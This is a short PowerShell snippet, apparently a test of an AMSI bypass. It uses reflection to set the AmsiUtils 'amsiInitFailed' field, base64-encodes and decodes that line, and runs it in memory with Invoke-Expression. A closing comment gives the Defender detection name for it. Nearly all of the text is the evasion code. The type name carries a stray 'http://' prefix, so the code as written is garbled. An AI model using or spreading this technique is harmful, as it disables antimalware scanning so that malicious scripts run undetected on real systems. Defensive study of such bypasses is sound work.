$script = "[Ref].Assembly.GetType('http://System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
$encodedScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($script))
$decodedScript = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encodedScript))

# To run the decoded script in memory, you can use the Invoke-Expression cmdlet
Invoke-Expression $decodedScript

#Detection Name : Trojan:Win32/AmsiTamper.A!ams 
